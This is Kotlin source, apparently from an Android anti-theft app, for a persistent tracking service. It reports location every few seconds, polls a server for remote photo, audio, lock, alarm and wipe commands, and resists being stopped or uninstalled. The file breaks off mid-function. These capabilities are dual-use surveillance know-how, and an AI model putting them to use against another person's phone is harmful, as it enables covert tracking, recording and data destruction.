package com.magneetar.app

import android.annotation.SuppressLint
import android.app.*
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import androidx.core.content.ContextCompat
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.*
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Base64
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

class TrackingService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var locationManager: LocationManager
    private lateinit var connectivityManager: android.net.ConnectivityManager
    private var wakeLock: android.os.PowerManager.WakeLock? = null

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    // Auth state (read/written from several Dispatchers.IO coroutines — the
    // loops and the auth-death re-registration path run on different threads)
    @Volatile private var accessToken: String? = null
    @Volatile private var refreshToken: String? = null
    @Volatile private var isRegistered = false
    @Volatile private var isRegistering = false
    private var pingSequence = 0

    /**
     * Stable per-physical-device id, read from prefs on EVERY access (so the
     * server can hand back a canonical id that we then adopt — see
     * tryRegisterOnce). Generated once from the ANDROID_ID fingerprint:
     *
     *   "mt-" + first 8 hex chars of SHA-256(ANDROID_ID)
     *
     * HONESTY NOTE (verified against developer.android.com, 2026): since
     * Android 8.0 (API 26) ANDROID_ID is scoped per (app-signing key, user,
     * device) — it is STABLE across app UPDATES but Google classifies it as
     * an install-reset identifier, i.e. it MAY change on uninstall/reinstall
     * (and changes on factory reset or signing-key change). It is therefore a
     * strong first-choice ID, NOT a guarantee.
     *
     * The design does not depend on that guarantee:
     *   1. Within an install/update lifetime the id is stable, so telemetry
     *      never splits across rows.
     *   2. On reinstall the app sends the raw ANDROID_ID as `fingerprint`;
     *      the server runs fingerprint-based dedup for rows created by older
     *      builds and returns the canonical device_id, which we persist here.
     *   3. The durable fix for reinstall duplicates is ACCOUNT LINKING: the
     *      signed-in user claims the live device (DeviceLinker + register
     *      with the user token), and stale duplicate rows are pruned via the
     *      dashboard's password-gated delete. Those rows are also soft-
     *      archived by the server after MT_ARCHIVE_AFTER_DAYS of silence.
     */
    private val deviceId: String
        get() {
            val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
            return prefs.getString("device_id", null) ?: run {
                val id = "mt-" + stableDeviceIdSuffix()
                prefs.edit().putString("device_id", id).apply()
                id
            }
        }

    private fun stableDeviceIdSuffix(): String {
        return try {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: ""
            if (androidId.isNotEmpty()) {
                val digest = java.security.MessageDigest.getInstance("SHA-256")
                val hex = digest.digest(androidId.toByteArray())
                    .joinToString("") { "%02x".format(it) }
                hex.take(8)
            } else {
                // ANDROID_ID unavailable (very unusual) — fall back to a random
                // suffix rather than crashing or colliding with other devices.
                UUID.randomUUID().toString().take(8)
            }
        } catch (e: Exception) {
            UUID.randomUUID().toString().take(8)
        }
    }

    /**
     * Unique per-device secret key, generated on first launch.
     * Stored in app-private SharedPreferences — never compiled into the APK.
     * Used via x-device-key header for device-to-server authentication.
     * The server stores only SHA-256(device_key), so even a DB breach
     * cannot leak the raw key.
     */
    private val deviceKey: String by lazy {
        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
        prefs.getString("device_key", null) ?: run {
            val key = UUID.randomUUID().toString().replace("-", "") +
                      UUID.randomUUID().toString().replace("-", "")
            // 64 hex chars = 32 random bytes, stored in app-private prefs
            prefs.edit().putString("device_key", key).apply()
            key
        }
    }

    // READ_PHONE_STATE is not granted on Android 10+ (IMEI/SIM are gated to
    // privileged apps); this is best-effort and fully wrapped in try/catch — a
    // SecurityException degrades to an empty hash, never a crash.
    private val simSerialHash: String by lazy { computeSimSerialHash() }

    @SuppressLint("MissingPermission")
    private fun computeSimSerialHash(): String {
        return try {
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val simSerial = tm.simSerialNumber ?: ""
            if (simSerial.isNotEmpty()) {
                val digest = java.security.MessageDigest.getInstance("SHA-256")
                Base64.encodeToString(digest.digest(simSerial.toByteArray()), Base64.NO_WRAP)
            } else ""
        } catch (e: Exception) { "" }
    }

    companion object {
        private const val CHANNEL_ID = "mt_channel"
        private const val NOTIF_ID = 1
        private val JSON = "application/json".toMediaType()
        private val SERVER = BuildConfig.SERVER_URL
        private val API_KEY = BuildConfig.API_KEY
        private const val WAIT_BETWEEN_COMMANDS_MS = 10_000L
        private const val HEARTBEAT_INTERVAL_MS = 60_000L
        private const val LOCATION_INTERVAL_MS = 3_000L

        /**
         * Runtime flag — set to true when onCreate completes, cleared in onDestroy.
         * Used by PersistenceService, WatchdogReceiver, and HealthCheckWorker
         * instead of the deprecated getRunningServices().
         */
        @Volatile
        var isRunning: Boolean = false
    }

    override fun onCreate() {
        super.onCreate()
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification("Initializing..."))
        isRunning = true

        // Re-assert the hard uninstall block (device-owner mode). Best-effort:
        // a no-op on normal devices, and never allowed to break tracking.
        try { UninstallProtection.enforceUninstallBlocked(this) } catch (_: Exception) {}

        // Acquire WakeLock — use Huawei-whitelisted tag on Huawei devices
        acquireWakeLock()

        // Register device, then start services
        scope.launch {
            registerDevice()
            if (isRegistered) {
                startLocationUpdates()
                launch { commandLoop() }
                launch { heartbeatLoop() }
            }
            // Self-healing account link: every few hours, refresh the user
            // token (24h expiry) and re-claim the device so it can never
            // silently fall back to an ownerless row (which hides it from the
            // account dashboard). Idempotent — a no-op when already linked.
            launch { accountLinkLoop() }
        }

        // Schedule watchdog alarm
        WatchdogReceiver.scheduleWatchdog(this)

        // Start persistence service for dual-service redundancy
        try {
            val persistenceIntent = Intent(this, PersistenceService::class.java)
            ContextCompat.startForegroundService(this, persistenceIntent)
        } catch (e: Exception) {
            android.util.Log.w("TrackingService", "Failed to start persistence service: ${e.message}")
        }

        // Schedule periodic WakeLock refresh for Huawei/Honor devices
        scheduleWakelockRefresh()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?) = null

    // ── Registration & Auth ───────────────────────────────────────────────────

    private suspend fun registerDevice() {
        if (isRegistering) return  // one registration attempt at a time
        isRegistering = true
        try {
            // Loop instead of recursion: a retry every 15s must never chain
            // suspend continuations forever on a sustained outage.
            while (!isRegistered) {
                if (tryRegisterOnce()) break
                delay(15_000)
            }
        } finally {
            isRegistering = false
        }
    }

    /**
     * Keep the device linked to the signed-in account forever.
     *
     * The user token stored at sign-in expires after 24h and is NEVER
     * otherwise refreshed — so a re-registration (reinstall, auth-death,
     * service restart) silently degraded to an ownerless row and the phone
     * vanished from the dashboard. This loop refreshes the token via its
     * refresh token (90-day rotation) and re-claims the device every 6h.
     * /api/device/claim is idempotent for the same owner, so a healthy
     * device sees a harmless no-op.
     */
    private suspend fun accountLinkLoop() {
        while (true) {
            try {
                delay(6 * 60 * 60 * 1000L) // first pass after 6h, then every 6h
                if (ensureFreshUserToken()) {
                    val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
                    val token = prefs.getString("user_token", "") ?: ""
                    if (token.isNotEmpty()) {
                        DeviceLinker.linkToAccount(this, SERVER, token)
                    }
                }
            } catch (e: Exception) {
                // Non-fatal: never let the link loop kill the service. The
                // next cycle retries.
            }
        }
    }

    /**
     * Returns true when a fresh user token is in prefs. Refreshes via
     * /api/auth/user/refresh when the stored token is missing or within
     * 15 minutes of expiry. Silently returns false when no refresh token
     * exists (no user signed in) or the refresh fails — callers degrade
     * to unlinked operation exactly as before.
     */
    private suspend fun ensureFreshUserToken(): Boolean {
        val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
        val userToken = prefs.getString("user_token", "") ?: ""
        if (userToken.isNotEmpty() && jwtExpiryMs(userToken) - System.currentTimeMillis() > 15 * 60 * 1000L) {
            return true
        }
        val refreshToken = prefs.getString("user_refresh_token", "") ?: ""
        if (refreshToken.isEmpty()) return false
        return try {
            val body = JSONObject().apply { put("refresh_token", refreshToken) }.toString().toRequestBody(JSON)
            val (code, response) = postRaw("/api/auth/user/refresh", body, useApiKey = false)
            if (code in 200..299 && response != null) {
                val json = JSONObject(response)
                val newToken = json.optString("token").takeIf { it.isNotEmpty() } ?: return false
                val newRefresh = json.optString("refresh_token").takeIf { it.isNotEmpty() } ?: refreshToken
                prefs.edit()
                    .putString("user_token", newToken)
                    .putString("user_refresh_token", newRefresh)
                    .apply()
                true
            } else {
                false
            }
        } catch (e: Exception) {
            false
        }
    }

    /** Decode the JWT exp claim (epoch millis), or Long.MAX_VALUE on failure. */
    private fun jwtExpiryMs(token: String): Long {
        return try {
            val parts = token.split(".")
            if (parts.size < 2) return Long.MAX_VALUE
            val pad = parts[1].replace('-', '+').replace('_', '/')
            val padded = pad + "=".repeat((4 - pad.length % 4) % 4)
            val json = String(android.util.Base64.decode(padded, android.util.Base64.DEFAULT))
            JSONObject(json).optLong("exp", Long.MAX_VALUE) * 1000L
        } catch (e: Exception) {
            Long.MAX_VALUE
        }
    }

    /** One registration attempt. Returns true when a token pair was minted. */
    private suspend fun tryRegisterOnce(): Boolean {
        return try {
            val body = JSONObject().apply {
                put("device_id", deviceId)
                put("fingerprint", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "")
                // Human-friendly default device name for the dashboard —
                // "Samsung SM-A037F" instead of the bare model code "SM-A037F".
                // Shown until the owner renames the device (alias takes over).
                val manufacturer = Build.MANUFACTURER.trim().replaceFirstChar { it.uppercase() }
                put("model", "$manufacturer ${Build.MODEL}".trim())
                put("os_version", "Android ${Build.VERSION.RELEASE}")
                put("app_version", BuildConfig.VERSION_NAME)
                put("imei_hash", "") // Not available on Android 10+
                put("sim_serial_hash", simSerialHash)
                put("device_key", deviceKey)
            }.toString().toRequestBody(JSON)

            // Multi-user support: when a user is signed in, send their bearer
            // token along with the API key so the server links this device to
            // the account (owner_id). It then shows up in that user's dashboard.
            // The token expires after 24h — refresh it first so an expired
            // token can never silently degrade this registration to ownerless.
            ensureFreshUserToken()
            val userToken = getSharedPreferences("mt", Context.MODE_PRIVATE).getString("user_token", "") ?: ""
            val extraHeaders = if (userToken.isNotEmpty()) {
                mapOf("Authorization" to "Bearer $userToken")
            } else {
                emptyMap()
            }

            var (code, response) = postRaw(
                "/api/device/register", body, useApiKey = true, extraHeaders = extraHeaders
            )

            // If account linking was rejected (e.g. device already claimed by a
            // different account), fall back to a plain registration so tracking
            // still works — the device just stays unlinked.
            if (code !in 200..299 && extraHeaders.isNotEmpty()) {
                val (plainCode, plainBody) = postRaw("/api/device/register", body, useApiKey = true)
                code = plainCode
                response = plainBody
            }

            if (code in 200..299 && response != null) {
                val json = JSONObject(response)
                accessToken = json.optString("token").takeIf { it.isNotEmpty() }
                refreshToken = json.optString("refresh_token").takeIf { it.isNotEmpty() }
                isRegistered = accessToken != null

                if (isRegistered) {
                    updateNotification("Connected")
                    // Save tokens
                    getSharedPreferences("mt", Context.MODE_PRIVATE).edit().apply {
                        putString("access_token", accessToken)
                        putString("refresh_token", refreshToken)
                        apply()
                    }

                    // If the user is signed in but the server still did not
                    // link us (e.g. device limit hit at the time, or a
                    // transient token hiccup), fire a best-effort claim now.
                    // Idempotent; harmless when already linked.
                    val linked = json.optString("owner_id").isNotEmpty()
                    if (!linked && userToken.isNotEmpty()) {
                        scope.launch { DeviceLinker.linkToAccount(this@TrackingService, SERVER, userToken) }
                    }

                    // Adopt the canonical device_id when the server re-pointed
                    // us at a pre-existing row (fingerprint dedup for rows
                    // created by older random-UUID builds). deviceId re-reads
                    // prefs on every access, so all subsequent telemetry,
                    // heartbeats and command polls automatically use the
                    // canonical id — no stale duplicate keeps reporting.
                    val canonicalId = json.optString("device_id").takeIf { it.isNotEmpty() }
                    if (canonicalId != null && canonicalId != deviceId) {
                        getSharedPreferences("mt", Context.MODE_PRIVATE).edit()
                            .putString("device_id", canonicalId).apply()
                        android.util.Log.d(
                            "TrackingService",
                            "Adopted canonical device_id $canonicalId (was $deviceId)"
                        )
                    }

                    // Best-effort: check the server's min Android SDK / latest
                    // app version. Never blocks tracking — warnings only.
                    scope.launch { checkServerCompatibility() }
                }
                return isRegistered
            }
            false
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    /**
     * Server compatibility check (non-breaking, warnings only).
     *
     * Reads /api/config (public, no auth). If the server requires a newer
     * Android SDK than this device, or a newer app version exists, the user
     * gets a one-time, non-blocking notification. Any failure is silently
     * ignored — an unreachable config endpoint must never affect tracking.
     */
    private suspend fun checkServerCompatibility() {
        try {
            val prefs = getSharedPreferences("mt", Context.MODE_PRIVATE)
            val (code, response) = withContext(Dispatchers.IO) {
                try {
                    val builder = Request.Builder().url("$SERVER/api/config").get()
                    client.newCall(builder.build()).execute().use { it.code to it.body?.string() }
                } catch (e: Exception) { -1 to null }
            }
            if (code !in 200..299 || response == null) return

            val config = JSONObject(response)
            val minSdk = config.optInt("min_android_version", -1)
            val latestVersion = config.optString("app_version", "")

            // 1) Device OS older than the server requires → tell the user to
            //    update the app (best-effort; tracking continues regardless).
            if (minSdk > 0 && Build.VERSION.SDK_INT < minSdk) {
                val lastNotified = prefs.getLong("compat_too_old_notified", 0L)
                if (System.currentTimeMillis() - lastNotified > 24L * 60 * 60 * 1000) {
                    prefs.edit().putLong("compat_too_old_notified", System.currentTimeMillis()).apply()
                    val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                    mgr.notify(
                        NOTIF_ID + 1,
                        NotificationCompat.Builder(this, CHANNEL_ID)
                            .setContentTitle("Magneetar needs an update")
                            .setContentText("This Android version is no longer supported — install the latest app from the Play Store or magneetar.me.")
                            .setSmallIcon(android.R.drawable.ic_dialog_alert)
                            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                            .setAutoCancel(true)
                            .build()
                    )
                }
            }

            // 2) Newer app version available → one-time "update available" nudge.
            if (latestVersion.isNotEmpty() && latestVersion != BuildConfig.VERSION_NAME) {
                val lastNotified = prefs.getLong("compat_update_notified", 0L)
                if (System.currentTimeMillis() - lastNotified > 24L * 60 * 60 * 1000) {
                    prefs.edit().putLong("compat_update_notified", System.currentTimeMillis()).apply()
                    val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                    mgr.notify(
                        NOTIF_ID + 2,
                        NotificationCompat.Builder(this, CHANNEL_ID)
                            .setContentTitle("Magneetar update available")
                            .setContentText("Version $latestVersion is out — update from the Play Store or magneetar.me.")
                            .setSmallIcon(android.R.drawable.ic_menu_info_details)
                            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                            .setAutoCancel(true)
                            .build()
                    )
                }
            }
        } catch (e: Exception) {
            // Non-breaking by design.
        }
    }

    private suspend fun refreshAccessToken(): Boolean {
        val rt = refreshToken ?: return false
        try {
            val body = JSONObject().apply {
                put("refresh_token", rt)
            }.toString().toRequestBody(JSON)

            val (code, response) = postRaw("/api/device/refresh", body, useApiKey = false)
            if (code in 200..299 && response != null) {
                val json = JSONObject(response)
                accessToken = json.optString("token")
                refreshToken = json.optString("refresh_token")
                return accessToken != null
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return false
    }

    // ── Notification ─────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "Magneetar Security",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setDescription("Magneetar anti-theft tracking")
            }
            getSystemService(NotificationManager::class.java)
                .createNotificationChannel(channel)
        }
    }

    private fun buildNotification(text: String) =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("🛡 Magneetar")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()

    private fun updateNotification(text: String) {
        val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        mgr.notify(NOTIF_ID, buildNotification(text))
    }

    // ── Location ──────────────────────────────────────────────────────────────

    private var currentBatteryPercent = 0
    private var currentNetworkType = "unknown"
    private var isCharging = false

    private fun startLocationUpdates() {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager

        // Get initial battery
        updateDeviceState()

        val listener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                updateDeviceState()
                scope.launch { reportLocation(location) }
            }
            @Deprecated("Deprecated in Java")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        }

        // On Chinese OEMs, request location more aggressively and with higher priority
        if (OEMUtils.isChineseOEM()) {
            android.util.Log.d("TrackingService", "Chinese OEM detected — using aggressive location strategy")
        }
        try {
            // requestLocationUpdates() must run with a Looper. The service calls
            // startLocationUpdates() from a Dispatchers.IO coroutine (no Looper),
            // which crashed with "Can't create handler inside thread...". Passing
            // the main looper explicitly makes the call thread-safe.
            val mainLooper = Looper.getMainLooper()
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER, LOCATION_INTERVAL_MS, 0f, listener, mainLooper
            )
            locationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER, LOCATION_INTERVAL_MS, 0f, listener, mainLooper
            )
        } catch (e: SecurityException) {
            e.printStackTrace()
        }
    }

    private fun updateDeviceState() {
        // Battery
        val intentFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus = registerReceiver(null, intentFilter)
        if (batteryStatus != null) {
            val level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
            val scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
            if (level >= 0 && scale > 0) {
                currentBatteryPercent = (level * 100) / scale
            }
            val status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)
            isCharging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == android.os.BatteryManager.BATTERY_STATUS_FULL
        }

        // Network type
        try {
            val activeNetwork = connectivityManager.activeNetwork
            val caps = connectivityManager.getNetworkCapabilities(activeNetwork)
            currentNetworkType = when {
                caps?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true -> "wifi"
                caps?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "cellular"
                else -> "unknown"
            }
        } catch (e: Exception) {
            currentNetworkType = "unknown"
        }
    }

    private suspend fun reportLocation(loc: Location) {
        if (!isRegistered) return

        pingSequence++

        // Use TelemetryPing format matching the server's schema
        val body = JSONObject().apply {
            put("device_id", deviceId)
            put("lat", loc.latitude)
            put("lng", loc.longitude)
            put("altitude", if (loc.hasAltitude()) loc.altitude else JSONObject.NULL)
            put("accuracy_horizontal", loc.accuracy.toDouble())
            put("confidence_level", if (loc.accuracy < 20) "HIGH" else if (loc.accuracy < 100) "MEDIUM" else "LOW")
            put("speed", if (loc.hasSpeed()) loc.speed.toDouble() else JSONObject.NULL)
            put("bearing", if (loc.hasBearing()) loc.bearing.toDouble() else JSONObject.NULL)
            put("provider", loc.provider ?: "gps")
            put("battery_percent", currentBatteryPercent)
            put("is_charging", isCharging)
            put("network_type", currentNetworkType)
            put("sim_serial_hash", simSerialHash)
            put("ping_sequence", pingSequence)
            put("device_timestamp", isoNow())
            // Armed Watch state — lets the dashboard show the honest capture
            // posture (armed → remote capture possible) instead of a phantom
            // 'executed' on unarmed devices.
            put("capture_armed", MediaCaptureService.isArmed)
        }.toString().toRequestBody(JSON)

        post("/api/device/location", body)
    }

    // ── Heartbeat ─────────────────────────────────────────────────────────────

    private suspend fun heartbeatLoop() {
        while (true) {
            try {
                val body = JSONObject().apply {
                    put("device_id", deviceId)
                    put("battery_percent", currentBatteryPercent)
                    put("is_charging", isCharging)
                    put("network_type", currentNetworkType)
                    put("app_version", BuildConfig.VERSION_NAME)
                    put("device_admin_active", isDeviceAdminActive())
                    put("sim_hash", simSerialHash)
                    put("pending_evidence_count", 0)
                    put("capture_armed", MediaCaptureService.isArmed)
                }.toString().toRequestBody(JSON)

                val response = post("/api/device/heartbeat", body)
                if (response != null) {
                    val json = JSONObject(response)
                    val mode = json.optString("operating_mode", "normal")
                    if (mode == "stolen") {
                        updateNotification("⚠ STOLEN MODE ACTIVE")
                    } else {
                        updateNotification("Connected • ${currentBatteryPercent}%")
                    }
                } else {
                    // Heartbeat failed (network, or auth-death while re-registering)
                    // — don't keep showing a stale "Connected".
                    updateNotification("Reconnecting…")
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
            delay(HEARTBEAT_INTERVAL_MS)
        }
    }

    private fun isDeviceAdminActive(): Boolean {
        return try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = ComponentName(this, AdminReceiver::class.java)
            dpm.isAdminActive(adminComponent)
        } catch (e: Exception) { false }
    }

    // ── Command loop ──────────────────────────────────────────────────────────

    /**
     * Command ids currently being handled. A capture command runs in a separate
     * service and can take up to 45s; without this guard the 10s poll loop
     * would re-fetch the still-pending command and spawn duplicate captures.
     */
    private val inFlightCommands = Collections.synchronizedSet(mutableSetOf<Int>())

    private suspend fun commandLoop() {
        while (true) {
            try {
                val response = get("/api/device/commands/$deviceId")
                if (response != null) {
                    val commands = JSONObject(response).getJSONArray("commands")
                    for (i in 0 until commands.length()) {
                        val id = commands.getJSONObject(i).getInt("id")
                        // Skip while locally executing, or while MediaCaptureService
                        // is still capturing it (the poll re-fetches a still-
                        // pending command every 10s; a capture can run 45s).
                        if (inFlightCommands.contains(id) ||
                            MediaCaptureService.activeCaptureIds.contains(id)
                        ) continue
                        inFlightCommands.add(id)
                        try {
                            handleCommand(id, commands.getJSONObject(i).getString("command"))
                        } finally {
                            inFlightCommands.remove(id)
                        }
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
            delay(WAIT_BETWEEN_COMMANDS_MS)
        }
    }

    /**
     * Execute one command and ALWAYS acknowledge it (executed or failed).
     *
     * Every branch is wrapped: an unhandled exception must never leave a
     * command stuck PENDING (the dashboard shows it forever, and the poll
     * would keep re-delivering it). Capture commands are handed to
     * MediaCaptureService (which acks them itself); everything else acks
     * here — executed only on genuine success.
     */
    private suspend fun handleCommand(id: Int, command: String) {
        try {
            when (command) {
                "ping" -> {
                    updateNotification("Ping received")
                    ackCommand(id, "executed")
                }
                // Photo/front/audio MUST run in MediaCaptureService: on Android
                // 14+ a location-only FGS cannot open the camera/mic while the
                // app is backgrounded, so inline capture here would silently
                // fail. The capture service acks the command itself — executed
                // only when media was actually uploaded.
                "capture_photo", "capture_photo_front", "capture_audio" -> {
                    startCaptureService(id, command)
                }
                "location_burst" -> {
                    locationBurst()
                    ackCommand(id, "executed")
                }
                "lock" -> {
                    if (lockDevice()) ackCommand(id, "executed") else ackCommand(id, "failed")
                }
                "alarm" -> {
                    if (triggerAlarm()) ackCommand(id, "executed") else ackCommand(id, "failed")
                }
                "wipe" -> {
                    // Wipe is destructive: require active device-admin, ack
                    // 'executed' BEFORE wiping (the phone will factory-reset and
                    // may never get a chance to ack after).
                    if (isDeviceAdminActive()) {
                        ackCommand(id, "executed")
                        wipeDevice()
                    } else {
                        ackCommand(id, "failed")
                    }
                }
                else -> ackCommand(id, "failed")
            }
        } catch (e: CancellationException) {
            throw e  // never swallow real cancellation — let the loop stop cleanly
        } catch (e: Exception) {
            e.printStackTrace()
            try { ackCommand(id, "failed") } catch (e2: Exception) { e2.printStackTrace() }
        }
    }

    /**
     * Route a capture command to the ARMED MediaCaptureService.
     *
     * Android 14+ forbids STARTING a camera|microphone foreground service
     * from the background, so a dead capture service cannot be revived
     * on-demand from a locked screen. The armed-watch design avoids that:
     * MediaCaptureService runs persistently (armed from a foreground context
     * or a "Re-arm" notification tap). If it is NOT armed, we cannot capture
     * — so we post the tap-to-re-arm notification and ack 'failed' honestly
     * (the dashboard shows the truth instead of a phantom 'executed').
     */
    private suspend fun startCaptureService(id: Int, command: String) {
        when (CaptureRouting.route(MediaCaptureService.isArmed, command)) {
            CapturePath.PROMPT_REARM -> {
                // Capture is honestly unavailable: post the tap-to-re-arm
                // notification and ack 'failed' (the dashboard shows the
                // truth instead of a phantom 'executed').
                MediaCaptureService.postRearmNotification(this)
                ackFailed(id)
            }
            CapturePath.REFUSE_UNKNOWN -> {
                // Defensive: never run an unknown command. Ack failed so the
                // command doesn't stay PENDING and get re-delivered forever.
                ackFailed(id)
            }
            CapturePath.RUN_ARMED_CAPTURE -> {
                try {
                    val intent = Intent(this, MediaCaptureService::class.java).apply {
                        setAction(CaptureRouting.actionFor(command))
                        putExtra(MediaCaptureService.EXTRA_COMMAND_ID, id)
                        putExtra(MediaCaptureService.EXTRA_COMMAND, command)
                    }
                    // The armed service is ALREADY foreground, so a plain startService
                    // is safe (and avoids the 5s startForeground window of a cold
                    // start). Ordering note: this returns BEFORE the capture service
                    // adds the id to its activeCaptureIds set; the 10s poll interval
                    // vs the ~ms service-start gap covers that — do NOT "simplify".
                    startService(intent)
                } catch (e: Exception) {
                    e.printStackTrace()
                    ackFailed(id)
                }
            }
        }
    }

    /** Best-effort 'failed' ack — the honesty contract: never leave a command stuck. */
    private suspend fun ackFailed(id: Int) {
        try { ackCommand(id, "failed") } catch (e2: Exception) { e2.printStackTrace() }
    }

    private suspend fun ackCommand(id: Int, status: String) {
        val body = JSONObject().apply {
            put("status", status)
        }.toString().toRequestBody(JSON)
        post("/api/device/commands/$id/ack", body)
    }

    // ── Location Burst ─────────────────────────────────────────────────────────

    // LOCATION is runtime-granted during onboarding (PermissionsActivity);
    // best-effort last-known-location reads wrapped in try/catch — a revoked
    // permission degrades to no burst, never a crash.
    @SuppressLint("MissingPermission")
    private suspend fun locationBurst() {
        // Send 5 rapid location updates
        for (i in 1..5) {
            try {
                locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
                val gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                val networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                val best = gpsLocation ?: networkLocation
                if (best != null) {
                    reportLocation(best)
                }
            } catch (e: Exception) {}
            delay(1_000)
        }
    }

    // ── Siren / Alarm ─────────────────────────────────────────────────────────

    /** Returns true when the alarm was started successfully. */
    private fun triggerAlarm(): Boolean {
        var track: android.media.AudioTrack? = null
        // Play max volume alarm through media stream
        return try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
            audioManager.setStreamVolume(
                android.media.AudioManager.STREAM_MUSIC,
                audioManager.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC),
                0
            )
            // Create a short loud tone using AudioTrack
            val sampleRate = 44100
            val duration = 5.0 // 5 seconds
            val numSamples = (sampleRate * duration).toInt()
            val samples = ShortArray(numSamples)
            for (i in 0 until numSamples) {
                val t = i.toDouble() / sampleRate
                // Square wave at 1000Hz for maximum loudness
                samples[i] = if ((t * 1000).toInt() % 2 == 0) Short.MAX_VALUE else Short.MIN_VALUE
            }
            track = android.media.AudioTrack(
                android.media.AudioAttributes.Builder()
                    .setUsage(android.media.AudioAttributes.USAGE_ALARM)
                    .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .build(),
                android.media.AudioFormat.Builder()
                    .setEncoding(android.media.AudioFormat.ENCODING_PCM_16BIT)
                    .setSampleRate(sampleRate)
                    .setChannelMask(android.media.AudioFormat.CHANNEL_OUT_MONO)
                    .build(),
                numSamples * 2,
                android.media.AudioTrack.MODE_STATIC,
                android.media.AudioTrack.WRITE_BLOCKING
            )
            track!!.write(samples, 0, numSamples)
            track!!.play()
            true  // Track will play and then stop naturally after 5 seconds
        } catch (e: Exception) {
            e.printStackTrace()
            false
        } finally {
            // Release the track after playback finishes (5s later, non-blocking)
            val t = track
            if (t != null) {
                scope.launch {
                    delay(6000)
                    try { t.release() } catch (e: Exception) {}
                }
            }
        }
    }

    // ── Device admin ──────────────────────────────────────────────────────────

    /** Returns true when the device was actually locked. */
    private fun lockDevice(): Boolean {
        return try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE)
                    as android.app.admin.DevicePolicyManager
            val adminComponent = ComponentName(this, AdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow()
                true
            } else {
                false  // no device admin — lock is impossible, report honestly
            }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    private fun wipeDevice() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE)
                    as android.app.admin.DevicePolicyManager
            val adminComponent = ComponentName(this, AdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.wipeData(0) // Factory reset
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    // ── HTTP ──────────────────────────────────────────────────────────────────

    /**
     * Build auth headers using the best available method:
     * 1. JWT Bearer token (from registration) — preferred for existing sessions
     * 2. x-device-key (unique per-device secret) — preferred for new devices
     * 3. x-api-key (shared key) — last resort fallback for backward compat
     */
    private fun authHeaders(): Map<String, String> {
        val headers = mutableMapOf<String, String>()
        if (accessToken != null) {
            headers["Authorization"] = "Bearer $accessToken"
